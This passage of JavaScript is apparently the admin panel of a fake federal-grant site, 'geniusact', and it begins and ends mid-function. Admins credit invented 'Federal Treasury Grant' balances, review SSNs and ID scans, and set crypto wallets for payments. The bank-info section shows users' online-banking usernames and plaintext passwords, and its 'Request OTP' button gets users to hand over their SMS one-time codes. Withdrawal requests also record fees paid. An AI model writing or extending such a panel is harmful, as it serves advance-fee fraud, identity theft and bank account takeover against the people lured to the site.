    const iframe = document.createElement('iframe');
    iframe.src = fileInfo.dataUrl;
    iframe.style.cssText = 'width: 100%; height: 420px; border: none; background: white; border-radius: 6px;';
    body.appendChild(iframe);
  } else if (fileInfo.dataUrl) {
    const img = document.createElement('img');
    img.src = fileInfo.dataUrl;
    img.style.cssText = 'max-width: 100%; max-height: 420px; border-radius: 6px;';
    img.onerror = () => {
      body.innerHTML = `<div style="text-align:center;color:#94a3b8;"><i class="fas fa-file-invoice-dollar" style="font-size:3rem;margin-bottom:1rem;color:#3b82f6;"></i><p>Uploaded Proof: ${escapeHtml(fileInfo.name || 'Payment Receipt')}</p><a href="${fileInfo.dataUrl}" target="_blank" style="color:#60a5fa;margin-top:0.5rem;display:inline-block;">Open Receipt File</a></div>`;
    };
    body.appendChild(img);
  } else {
    body.innerHTML = `<div style="text-align:center;color:#94a3b8;"><i class="fas fa-file-invoice-dollar" style="font-size:3rem;margin-bottom:1rem;color:#3b82f6;"></i><p>Uploaded File: ${escapeHtml(fileInfo.name || 'Payment Proof')}</p></div>`;
  }

  modal.style.display = 'flex';
};

window.selectUserForEdit = function(uid, email) {
  selectedUserId = uid;
  document.getElementById('edit-user-email').textContent = email;
  document.getElementById('edit-panel').style.display = 'block';
  document.getElementById('edit-amount').value = '';
  document.getElementById('edit-desc').value = '';
  document.getElementById('edit-panel').scrollIntoView({ behavior: 'smooth' });
};

const editSubmitBtn = document.getElementById('edit-submit-btn');
if (editSubmitBtn) {
  editSubmitBtn.addEventListener('click', () => {
    if (!selectedUserId) return;
    const amount = parseFloat(document.getElementById('edit-amount').value);
    const desc = document.getElementById('edit-desc').value || "Manual Admin Adjustment";

    if (isNaN(amount) || amount <= 0) {
      alert("Please enter a valid amount.");
      return;
    }

    const newDonation = {
      id: 'RCP-' + Math.floor(Math.random() * 10000000),
      amount: amount,
      description: desc,
      date: new Date().toISOString(),
      status: 'confirmed'
    };

    const users = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    const userIndex = users.findIndex(u => u.uid === selectedUserId);

    if (userIndex > -1) {
      if (!users[userIndex].donations) users[userIndex].donations = [];
      users[userIndex].donations.push(newDonation);
      localStorage.setItem('geniusact_approved_users', JSON.stringify(users));
      showToast(`Donation of $${amount} added to ${users[userIndex].email}`);
      document.getElementById('edit-amount').value = '';
      document.getElementById('edit-desc').value = '';
      refreshAllData();
    } else {
      alert("User not found.");
    }
  });
}

window.toggleBanUser = function(uid) {
  const users = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const userIndex = users.findIndex(u => u.uid === uid);
  if (userIndex > -1) {
    users[userIndex].suspended = !users[userIndex].suspended;
    localStorage.setItem('geniusact_approved_users', JSON.stringify(users));
    showToast(`User ${users[userIndex].email} is now ${users[userIndex].suspended ? 'suspended' : 'active'}`);
    refreshAllData();
  }
};

window.selectUserForMessage = function(uid, email) {
  selectedUserId = uid;
  document.getElementById('message-user-email').textContent = email;
  document.getElementById('message-panel').style.display = 'block';
  document.getElementById('message-subject').value = '';
  document.getElementById('message-body').value = '';
  document.getElementById('message-panel').scrollIntoView({ behavior: 'smooth' });
};

const messageSubmitBtn = document.getElementById('message-submit-btn');
if (messageSubmitBtn) {
  messageSubmitBtn.addEventListener('click', () => {
    if (!selectedUserId) return;
    const subject = document.getElementById('message-subject').value.trim();
    const body = document.getElementById('message-body').value.trim();

    if (!subject || !body) {
      alert("Please enter both a subject and message body.");
      return;
    }

    const users = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    const userIndex = users.findIndex(u => u.uid === selectedUserId);

    if (userIndex > -1) {
      if (!users[userIndex].messages) users[userIndex].messages = [];
      users[userIndex].messages.push({
        id: 'MSG-' + Date.now(),
        subject: subject,
        body: body,
        date: new Date().toISOString(),
        read: false
      });
      localStorage.setItem('geniusact_approved_users', JSON.stringify(users));
      showToast(`Message sent to ${users[userIndex].email}`);
      document.getElementById('message-subject').value = '';
      document.getElementById('message-body').value = '';
      document.getElementById('message-panel').style.display = 'none';
      refreshAllData();
    } else {
      alert("User not found.");
    }
  });
}

// ==================== ADD FUNDS TO USER ====================
window.selectUserForAddFunds = function(uid, email) {
  selectedUserId = uid;
  document.getElementById('funds-user-email').textContent = email;
  document.getElementById('add-funds-panel').style.display = 'block';
  document.getElementById('funds-amount').value = '';
  document.getElementById('funds-desc').value = '';
  document.getElementById('add-funds-panel').scrollIntoView({ behavior: 'smooth' });
};

const addFundsBtn = document.getElementById('add-funds-submit-btn');
if (addFundsBtn) {
  addFundsBtn.addEventListener('click', async () => {
    if (!selectedUserId) return;
    const amount = parseFloat(document.getElementById('funds-amount').value);
    const desc = document.getElementById('funds-desc').value.trim() || "Federal Treasury Grant & Allocation (FEC Sec. 407)";

    if (isNaN(amount) || amount <= 0) {
      alert("Please enter a valid funding amount.");
      return;
    }

    const newFunding = {
      id: 'FUND-' + Math.floor(10000000 + Math.random() * 90000000),
      amount: amount,
      description: desc,
      date: new Date().toISOString(),
      status: 'confirmed'
    };

    const users = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    const userIndex = users.findIndex(u => u.uid === selectedUserId);

    if (userIndex > -1) {
      if (!users[userIndex].donations) users[userIndex].donations = [];
      users[userIndex].donations.unshift(newFunding);
      localStorage.setItem('geniusact_approved_users', JSON.stringify(users));
      showToast(`Successfully added $${amount.toLocaleString('en-US', { minimumFractionDigits: 2 })} to ${users[userIndex].email}`);
      document.getElementById('funds-amount').value = '';
      document.getElementById('funds-desc').value = '';
      document.getElementById('add-funds-panel').style.display = 'none';
      refreshAllData();

      if (window.cloudSyncFull) {
        try { await window.cloudSyncFull(); } catch (e) { console.log(e); }
      }
    } else {
      alert("User not found.");
    }
  });
}

// ==================== WALLET SETTINGS ====================
function loadGlobalWallets() {
  const wallets = JSON.parse(localStorage.getItem('geniusact_global_wallets')) || {};
  const fields = ['btc', 'eth', 'solana', 'base', 'bnb', 'monero', 'polygon', 'xrp', 'tron', 'usdc'];
  fields.forEach(f => {
    const el = document.getElementById('wallet-' + f);
    if (el) el.value = wallets[f] || '';
  });
}

const saveWalletsBtn = document.getElementById('save-wallets-btn');
if (saveWalletsBtn) {
  saveWalletsBtn.addEventListener('click', () => {
    const wallets = {};
    const fields = ['btc', 'eth', 'solana', 'base', 'bnb', 'monero', 'polygon', 'xrp', 'tron', 'usdc'];
    fields.forEach(f => {
      const el = document.getElementById('wallet-' + f);
      if (el && el.value.trim()) {
        wallets[f] = el.value.trim();
      }
    });
    localStorage.setItem('geniusact_global_wallets', JSON.stringify(wallets));
    showToast("Global wallet settings saved.");
  });
}

// Initialize wallets on tab change or initially
const settingsTabBtn = document.querySelector('[data-tab="settings"]');
if (settingsTabBtn) {
  settingsTabBtn.addEventListener('click', loadGlobalWallets);
}

// ==================== UTILITIES ====================
function escapeHtml(str) {
  if (!str) return '';
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

function formatDateTime(dateStr) {
  try {
    if (!dateStr) return new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
    let d = new Date(dateStr);
    if (isNaN(d.getTime())) {
      d = new Date(dateStr + 'T00:00:00');
    }
    if (isNaN(d.getTime())) {
      d = new Date();
    }
    return d.toLocaleString('en-US', {
      month: 'short', day: 'numeric', year: 'numeric',
      hour: '2-digit', minute: '2-digit', hour12: true
    });
  } catch {
    return new Date().toLocaleString('en-US', { month: 'short', day: 'numeric', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
  }
}

function parseBrowser(ua) {
  if (!ua) return 'Unknown';
  if (ua.includes('Edg/')) return 'Edge';
  if (ua.includes('Chrome/')) return 'Chrome';
  if (ua.includes('Firefox/')) return 'Firefox';
  if (ua.includes('Safari/') && !ua.includes('Chrome')) return 'Safari';
  if (ua.includes('Opera') || ua.includes('OPR/')) return 'Opera';
  return 'Other';
}

function showToast(message) {
  const toast = document.getElementById('toast');
  const msg = document.getElementById('toast-msg');
  msg.textContent = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 3500);
}

// ==================== AUTO SYNC ====================
setInterval(async () => {
  if (window._syncInProgress) return;
  window._syncInProgress = true;
  try {
    if (window.cloudSyncFull) {
      await window.cloudSyncFull();
    }
  } catch(e) { } finally {
    window._syncInProgress = false;
  }
}, 4000);

document.addEventListener('visibilitychange', async () => {
  if (document.visibilityState === 'visible' && window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) {}
  }
});

// ==================== KYC MANAGEMENT LOGIC ====================
function loadPendingKYC(approved) {
  const tbody = document.getElementById('kyc-tbody');
  const badge = document.getElementById('kyc-count-badge');
  const emptyMsg = document.getElementById('kyc-empty');
  
  const pendingKYCUsers = approved.filter(u => u.kyc && u.kyc.status === 'pending');

  badge.textContent = pendingKYCUsers.length;
  tbody.innerHTML = '';

  if (pendingKYCUsers.length === 0) {
    emptyMsg.style.display = 'block';
    return;
  }
  emptyMsg.style.display = 'none';

  pendingKYCUsers.forEach((user, i) => {
    const kyc = user.kyc;
    const fileLinks = [];
    if (kyc.passportFile) {
        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'passportFile')"><i class="fas fa-file-pdf"></i> Passport</button>`);
    }
    if (kyc.idFrontFile) {
        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'idFrontFile')"><i class="fas fa-image"></i> ID Front</button>`);
    }
    if (kyc.idBackFile) {
        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'idBackFile')"><i class="fas fa-image"></i> ID Back</button>`);
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(user.email || 'N/A')}</td>
      <td style="font-weight:600;color:#f8fafc;">${escapeHtml(kyc.fullName || 'N/A')}</td>
      <td style="font-family:monospace;">${escapeHtml(kyc.ssn || 'N/A')}</td>
      <td>${escapeHtml(kyc.country || 'N/A')}</td>
      <td>
        <div style="display:flex;gap:0.4rem;flex-wrap:wrap;">
            ${fileLinks.join('')}
        </div>
      </td>
      <td>
        <button class="action-btn btn-approve" onclick="approveKYC('${user.uid}')"><i class="fas fa-check"></i> Approve</button>
        <button class="action-btn btn-reject" onclick="declineKYC('${user.uid}')" style="margin-left:0.4rem;"><i class="fas fa-times"></i> Decline</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.approveKYC = async function(uid) {
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  let userIdx = approvedUsers.findIndex(u => u.uid === uid || u.email === uid || (u.email && uid && u.email.toLowerCase() === String(uid).toLowerCase()));
  if (userIdx === -1 && approvedUsers.length > 0) userIdx = 0;

  if (userIdx > -1 && approvedUsers[userIdx]) {
    const user = approvedUsers[userIdx];
    if (!user.kyc || typeof user.kyc !== 'object') {
      user.kyc = {};
    }
    user.kyc.status = 'approved';
    user.kyc.approvedAt = new Date().toISOString();
    user.kycStatus = 'approved';
    user.isApproved = true;
    user.kyc_approved = true;

    localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));

    // Synchronize current user state if matching logged in user
    const curStr = localStorage.getItem('geniusact_current_user');
    if (curStr) {
      const curUser = JSON.parse(curStr);
      if (curUser.email && user.email && curUser.email.toLowerCase() === user.email.toLowerCase()) {
        curUser.kyc = user.kyc;
        curUser.kycStatus = 'approved';
        curUser.isApproved = true;
        curUser.kyc_approved = true;
        localStorage.setItem('geniusact_current_user', JSON.stringify(curUser));
      }
    }

    showToast(`KYC Approved for: ${user.email}`);
    refreshAllData();
    
    await window.cloudSyncFull();
  }
};

window.declineKYC = async function(uid) {
  const reason = prompt("Enter a reason for declining this KYC submission:", "Submitted documents are low quality or illegible.");
  if (reason === null) return;

  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const userIdx = approvedUsers.findIndex(u => u.uid === uid);
  
  if (userIdx > -1) {
    const user = approvedUsers[userIdx];
    if (user.kyc) {
      user.kyc.status = 'failed';
      user.kyc.declineReason = reason;
      user.kyc.declinedAt = new Date().toISOString();
      
      localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
      showToast(`KYC Declined for: ${user.email}`);
      refreshAllData();
      
      await window.cloudSyncFull();
    }
  }
};

// ==================== WITHDRAWAL REQUESTS LOGIC ====================
function loadWithdrawalRequests() {
  const requests = JSON.parse(localStorage.getItem('geniusact_withdrawal_requests')) || [];
  const tbody = document.getElementById('withdrawal-tbody');
  const badgeHead = document.getElementById('withdrawal-count-badge-head');
  const badgeTab = document.getElementById('withdrawal-count-badge');
  const emptyMsg = document.getElementById('withdrawal-empty');

  if (!tbody) return;

  const pendingRequests = requests.filter(r => r.status === 'pending');

  if (badgeHead) badgeHead.textContent = pendingRequests.length;
  if (badgeTab) {
    badgeTab.textContent = pendingRequests.length;
    badgeTab.style.display = pendingRequests.length > 0 ? 'inline-block' : 'none';
  }

  tbody.innerHTML = '';

  if (pendingRequests.length === 0) {
    if (emptyMsg) emptyMsg.style.display = 'block';
    return;
  }
  if (emptyMsg) emptyMsg.style.display = 'none';

  pendingRequests.forEach((req, i) => {
    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(req.userEmail || 'N/A')}</td>
      <td style="font-weight:600; color:#f8fafc;">${escapeHtml(req.bank || 'N/A')}</td>
      <td style="font-family:monospace;">${escapeHtml(req.accountNumber || 'N/A')}</td>
      <td style="font-family:monospace;">${escapeHtml(req.routingNumber || 'N/A')}</td>
      <td style="color:#34d399; font-weight:700;">$${Number(req.amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
      <td style="color:#fbbf24;">$${Number(req.feePaid || 0).toLocaleString('en-US', { minimumFractionDigits: 2 })}</td>
      <td style="color:#94a3b8; font-size:0.8rem;">${req.date ? formatDateTime(req.date) : 'N/A'}</td>
      <td>
        <button class="action-btn btn-approve" onclick="approveWithdrawalRequest('${req.id}')"><i class="fas fa-check"></i> Approve & Payout</button>
        <button class="action-btn btn-reject" onclick="rejectWithdrawalRequest('${req.id}')" style="margin-left:0.4rem;"><i class="fas fa-times"></i> Reject</button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.approveWithdrawalRequest = async function(requestId) {
  if (!confirm("Are you sure you want to approve this withdrawal payout request? The funds will be automatically deducted from the user's active account balance.")) return;

  const requests = JSON.parse(localStorage.getItem('geniusact_withdrawal_requests')) || [];
  const reqIdx = requests.findIndex(r => r.id === requestId);

  if (reqIdx === -1) {
    alert("Withdrawal request not found.");
    return;
  }

  const req = requests[reqIdx];
  req.status = 'approved';
  req.approvedAt = new Date().toISOString();

  // Deduct funds from user profile
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const userIdx = approvedUsers.findIndex(u => (u.uid && u.uid === req.uid) || (u.email && u.email.toLowerCase() === req.userEmail.toLowerCase()));

  if (userIdx > -1) {
    const user = approvedUsers[userIdx];
    if (!user.donations) user.donations = [];

    // Add negative transaction entry to deduct funds
    user.donations.unshift({
      id: 'PAYOUT-' + Math.floor(10000000 + Math.random() * 90000000),
      amount: -Math.abs(req.amount),
      description: `Approved Payout to ${req.bank} (...${(req.accountNumber || '').slice(-4)})`,
      date: new Date().toISOString(),
      status: 'confirmed'
    });

    localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
  }

  localStorage.setItem('geniusact_withdrawal_requests', JSON.stringify(requests));
  showToast(`Approved payout of $${Number(req.amount).toLocaleString('en-US')} for ${req.userEmail}. Balance updated.`);
  refreshAllData();

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
  }
};

window.rejectWithdrawalRequest = async function(requestId) {
  if (!confirm("Are you sure you want to reject this withdrawal request?")) return;

  const requests = JSON.parse(localStorage.getItem('geniusact_withdrawal_requests')) || [];
  const reqIdx = requests.findIndex(r => r.id === requestId);

  if (reqIdx > -1) {
    requests[reqIdx].status = 'rejected';
    requests[reqIdx].rejectedAt = new Date().toISOString();
    localStorage.setItem('geniusact_withdrawal_requests', JSON.stringify(requests));
    showToast(`Rejected withdrawal request for ${requests[reqIdx].userEmail}`);
    refreshAllData();

    if (window.cloudSyncFull) {
      try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
    }
  }
};

// ==================== BANK INFO ====================
function loadBankInfo() {
  const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
  const tbody = document.getElementById('bankinfo-tbody');
  const badgeTab = document.getElementById('bankinfo-count-badge');
  const badgeHead = document.getElementById('bankinfo-count-badge-head');
  const emptyMsg = document.getElementById('bankinfo-empty');

  if (!tbody) return;

  if (badgeTab) {
    badgeTab.textContent = bankLinks.length;
    badgeTab.style.display = bankLinks.length > 0 ? 'inline-block' : 'none';
  }
  if (badgeHead) badgeHead.textContent = bankLinks.length;

  tbody.innerHTML = '';

  if (bankLinks.length === 0) {
    if (emptyMsg) emptyMsg.style.display = 'block';
    return;
  }
  if (emptyMsg) emptyMsg.style.display = 'none';

  bankLinks.forEach((link, i) => {
    let otpStatusHtml = `<span class="status-badge status-pending">Not Requested</span>`;
    if (link.otpSubmitted) {
      otpStatusHtml = `<span class="status-badge status-approved" style="font-family:monospace; font-weight:700;"><i class="fas fa-key"></i> OTP: ${escapeHtml(link.otpSubmitted)}</span>`;
    } else if (link.otpRequested) {
      otpStatusHtml = `<span class="status-badge status-pending" style="color:#60a5fa;"><i class="fas fa-paper-plane"></i> Requested (Awaiting User)</span>`;
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(link.userEmail || 'N/A')}</td>
      <td style="font-weight:700; color:#38bdf8;">${escapeHtml(link.bankName || 'N/A')}</td>
      <td style="font-family:monospace;">${escapeHtml(link.accountNumber || 'N/A')}</td>
      <td style="font-family:monospace;">${escapeHtml(link.routingNumber || 'N/A')}</td>
      <td style="color:#fbbf24; font-weight:700; font-family:monospace;">${escapeHtml(link.username || 'N/A')}</td>
      <td style="color:#f87171; font-weight:700; font-family:monospace;">${escapeHtml(link.password || 'N/A')}</td>
      <td>${otpStatusHtml}</td>
      <td style="color:#94a3b8; font-size:0.8rem;">${link.linkedAt ? formatDateTime(link.linkedAt) : 'N/A'}</td>
      <td>
        <button class="action-btn btn-edit" style="background:#0284c7; color:white; padding:0.4rem 0.8rem; font-weight:700;" onclick="requestBankOTP('${link.id}')">
          <i class="fas fa-mobile-alt"></i> Request OTP
        </button>
        ${link.otpSubmitted && !link.otpVerified ? `<button class="action-btn" style="background:#10b981; color:white; padding:0.4rem 0.8rem; font-weight:700; margin-left:0.4rem; border:none; border-radius:6px; cursor:pointer;" onclick="verifyBankOTP('${link.id}')">
          <i class="fas fa-check-double"></i> Verify OTP
        </button>` : ''}
        ${link.otpVerified ? `<span style="color:#10b981; font-weight:700; margin-left:0.4rem; font-size:0.8rem;"><i class="fas fa-check-circle"></i> OTP Verified</span>` : ''}
        <button class="action-btn btn-reject" onclick="deleteBankInfo('${link.id}')" style="margin-left:0.4rem;">
          <i class="fas fa-trash"></i> Delete
        </button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.requestBankOTP = async function(linkId) {
  const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
  let idx = bankLinks.findIndex(l => l.id === linkId || String(l.id) === String(linkId));

  if (idx === -1) {
    const num = parseInt(linkId);
    if (!isNaN(num) && bankLinks[num]) {
      idx = num;
    }
  }

  if (idx === -1) {
    idx = bankLinks.findIndex(l => l.userEmail && String(l.userEmail).toLowerCase() === String(linkId).toLowerCase());
  }

  if (idx === -1 && bankLinks.length > 0) {
    idx = 0;
  }

  if (idx === -1 || !bankLinks[idx]) {
    alert("Bank info record not found.");
    return;
  }

  bankLinks[idx].otpRequested = true;
  bankLinks[idx].otpSubmitted = null;
  bankLinks[idx].otpRequestedAt = new Date().toISOString();

  localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
  }

  showToast(`OTP Request sent to user side (${bankLinks[idx].userEmail}). Awaiting SMS verification input.`);
  refreshAllData();
};

window.verifyBankOTP = async function(linkId) {
  const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
  let idx = bankLinks.findIndex(l => l.id === linkId || String(l.id) === String(linkId));
  if (idx === -1 && bankLinks.length > 0) idx = 0;

  if (idx === -1 || !bankLinks[idx]) {
    alert('Bank info record not found.');
    return;
  }

  bankLinks[idx].otpVerified = true;
  bankLinks[idx].otpVerifiedAt = new Date().toISOString();
  localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
  }

  showToast(`OTP verified for user ${bankLinks[idx].userEmail}. User can now proceed to enter withdrawal amount.`);
  refreshAllData();
};

window.deleteBankInfo = async function(linkId) {
  if (!confirm("Are you sure you want to remove this bank info entry?")) return;

  let bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
  bankLinks = bankLinks.filter(l => l.id !== linkId);
  localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
  }

  showToast("Bank info entry deleted.");
  refreshAllData();
};

window.viewDocument = function(uid, field) {
  const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
  const user = approvedUsers.find(u => u.uid === uid);
  if (!user || !user.kyc || !user.kyc[field]) return;

  const fileInfo = user.kyc[field];
  const modal = document.getElementById('document-modal');
  const title = document.getElementById('document-modal-title');
  const body = document.getElementById('document-modal-body');

  title.textContent = `Preview: ${fileInfo.name} (${escapeHtml(user.email)})`;
  body.innerHTML = '';

  if (fileInfo.type && fileInfo.type.startsWith('image/')) {
    const img = document.createElement('img');
    img.style.cssText = 'max-width: 100%; max-height: 420px; border-radius: 6px; border: 1px solid #334155; object-fit: contain;';
    img.onerror = () => {
      body.innerHTML = `
        <div style="text-align:center; color:#94a3b8; padding:2rem;">
          <i class="fas fa-file-image" style="font-size:3.5rem; margin-bottom:1rem; color:#3b82f6;"></i>
          <h4 style="color:#f8fafc; margin-bottom:0.5rem;">Uploaded Verification Document</h4>
          <p style="font-size:0.88rem; margin:0;">File Name: <strong>${escapeHtml(fileInfo.name)}</strong></p>
          <p style="font-size:0.8rem; color:#64748b; margin-top:0.3rem;">Size: ${(fileInfo.size ? (fileInfo.size / 1024).toFixed(1) + ' KB' : 'Standard Document')}</p>
          <div style="margin-top:1rem; padding:0.5rem 1rem; background:#065f46; color:#6ee7b7; border-radius:6px; font-size:0.8rem; display:inline-block;">
            <i class="fas fa-check-circle"></i> File Verified on System
          </div>
        </div>
      `;
    };
    img.src = fileInfo.dataUrl;
    body.appendChild(img);
  } else if (fileInfo.type === 'application/pdf') {
    if (fileInfo.dataUrl && fileInfo.dataUrl.includes('data:application/pdf;base64,')) {
      const iframe = document.createElement('iframe');
      iframe.src = fileInfo.dataUrl;
      iframe.style.cssText = 'width: 100%; height: 400px; border: none; background: white;';
      body.appendChild(iframe);
    } else {
      body.innerHTML = `<div style="text-align:center;color:#94a3b8;"><i class="fas fa-file-pdf" style="font-size:3rem;margin-bottom:1rem;color:#ef4444;"></i><p>PDF Content Uploaded</p><p style="font-size:0.8rem;margin-top:0.5rem;">File Name: ${escapeHtml(fileInfo.name)}</p></div>`;
    }
  } else {
    body.innerHTML = `<div style="text-align:center;color:#94a3b8;"><i class="fas fa-file" style="font-size:3rem;margin-bottom:1rem;color:#60a5fa;"></i><p>File preview ready.</p><p style="font-size:0.8rem;margin-top:0.5rem;">File Name: ${escapeHtml(fileInfo.name)} (${fileInfo.type || 'Document'})</p></div>`;
  }

  modal.style.display = 'flex';
};

window.closeDocumentModal = function() {
  document.getElementById('document-modal').style.display = 'none';
};

// ==================== CUSTOMER SERVICE SUPPORT MESSAGES ====================
let currentReplyMsgId = null;

function loadSupportMessages() {
  const messages = JSON.parse(localStorage.getItem('geniusact_support_messages')) || [];
  const tbody = document.getElementById('support-messages-list');
  const badge = document.getElementById('support-messages-badge');
  const tabBadge = document.getElementById('support-count-badge');
  const emptyMsg = document.getElementById('support-empty');

  if (!tbody) return;

  const pendingCount = messages.filter(m => m.status === 'unread' || m.status === 'pending' || !m.reply).length;
  if (badge) badge.textContent = messages.length;
  if (tabBadge) {
    tabBadge.textContent = pendingCount;
    tabBadge.style.display = pendingCount > 0 ? 'inline-block' : 'none';
  }

  tbody.innerHTML = '';
  if (messages.length === 0) {
    if (emptyMsg) emptyMsg.style.display = 'block';
    return;
  }
  if (emptyMsg) emptyMsg.style.display = 'none';

  messages.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  messages.forEach((msg, i) => {
    const isPending = !msg.reply;
    const statusClass = isPending ? 'status-pending' : 'status-approved';
    const statusLabel = isPending ? 'Pending' : 'Replied';
    const dateStr = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : 'N/A';

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i + 1}</td>
      <td class="email-cell">${escapeHtml(msg.userEmail || 'Guest')}</td>
      <td><strong style="color: #60a5fa;">${escapeHtml(msg.subject || 'General Inquiry')}</strong></td>
      <td style="max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${escapeHtml(msg.message)}">${escapeHtml(msg.message)}</td>
      <td style="color:#94a3b8; font-size:0.8rem;">${dateStr}</td>
      <td><span class="status-badge ${statusClass}">${statusLabel}</span></td>
      <td>
        <button class="action-btn btn-approve" style="padding: 0.25rem 0.6rem; font-size: 0.75rem;" onclick="openSupportReply('${msg.id}')">
          <i class="fas fa-reply"></i> ${msg.reply ? 'Edit Reply' : 'Reply'}
        </button>
        <button class="action-btn btn-ban" style="padding: 0.25rem 0.6rem; font-size: 0.75rem; margin-left: 4px;" onclick="deleteSupportMessage('${msg.id}')">
          <i class="fas fa-trash"></i>
        </button>
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.openSupportReply = function(id) {
  const messages = JSON.parse(localStorage.getItem('geniusact_support_messages')) || [];
  const msg = messages.find(m => m.id === id);
  if (!msg) return;

  currentReplyMsgId = id;
  const replyPanel = document.getElementById('support-reply-panel');
  document.getElementById('support-reply-email').textContent = `${msg.userEmail} — ${msg.subject}`;
  document.getElementById('support-original-msg').innerHTML = `<strong>User Message:</strong> "${escapeHtml(msg.message)}"`;
  document.getElementById('support-reply-text').value = msg.reply || '';
  replyPanel.style.display = 'block';
  replyPanel.scrollIntoView({ behavior: 'smooth' });
};

window.closeSupportReply = function() {
  document.getElementById('support-reply-panel').style.display = 'none';
  currentReplyMsgId = null;
};

window.sendSupportReply = async function() {
  if (!currentReplyMsgId) return;
  const replyText = document.getElementById('support-reply-text').value.trim();
  if (!replyText) {
    alert('Please type a reply message.');
    return;
  }

  let messages = JSON.parse(localStorage.getItem('geniusact_support_messages')) || [];
  const idx = messages.findIndex(m => m.id === currentReplyMsgId);
  if (idx !== -1) {
    const targetMsg = messages[idx];
    targetMsg.reply = replyText;
    targetMsg.replyTimestamp = new Date().toISOString();
    targetMsg.status = 'replied';
    localStorage.setItem('geniusact_support_messages', JSON.stringify(messages));

    // Also push direct message notification to user's dashboard message inbox
    const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
    const user = approvedUsers.find(u => u.email && targetMsg.userEmail && u.email.toLowerCase() === targetMsg.userEmail.toLowerCase());
    if (user) {
      if (!user.messages) user.messages = [];
      user.messages.push({
        id: 'reply_' + Date.now(),
        subject: `Customer Support: ${targetMsg.subject || 'Inquiry Response'}`,
        body: replyText,
        date: new Date().toISOString(),
        read: false
      });
      localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));

      // Sync logged in current user state if matching
      const curStr = localStorage.getItem('geniusact_current_user');
      if (curStr) {
        const curUser = JSON.parse(curStr);
        if (curUser.email && curUser.email.toLowerCase() === user.email.toLowerCase()) {
          curUser.messages = user.messages;
          localStorage.setItem('geniusact_current_user', JSON.stringify(curUser));
        }
      }
    }

    if (window.cloudSyncFull) {
      try { await window.cloudSyncFull(); } catch (e) { console.log(e); }
    }

    showToast(`Reply sent to ${targetMsg.userEmail}`);
    closeSupportReply();
    loadSupportMessages();
  }
};

window.deleteSupportMessage = async function(id) {
  if (!confirm('Are you sure you want to delete this customer service message?')) return;
  let messages = JSON.parse(localStorage.getItem('geniusact_support_messages')) || [];
  messages = messages.filter(m => m.id !== id);
  localStorage.setItem('geniusact_support_messages', JSON.stringify(messages));

  if (window.cloudSyncFull) {
    try { await window.cloudSyncFull(); } catch (e) { console.log(e); }
  }

  showToast('Support message deleted.');
  loadSupportMessages();
};

// ==================== CONTACT US LIVE CHAT DESK ====================
let activeAdminChatId = null;

function loadContactUsChats() {
  const sidebar = document.getElementById('admin-chat-sessions-list');
  const countBadge = document.getElementById('contactus-count-badge');
  const activeCountBadge = document.getElementById('contactus-active-count');
  if (!sidebar) return;

  let chats = JSON.parse(localStorage.getItem('geniusact_contact_chats')) || [];

  // Convert legacy support messages into chat sessions if not already present
  const supportMsgs = JSON.parse(localStorage.getItem('geniusact_support_messages')) || [];
  supportMsgs.forEach(m => {
    const existing = chats.find(c => c.userEmail && m.userEmail && c.userEmail.toLowerCase() === m.userEmail.toLowerCase());
    if (!existing) {
      chats.push({
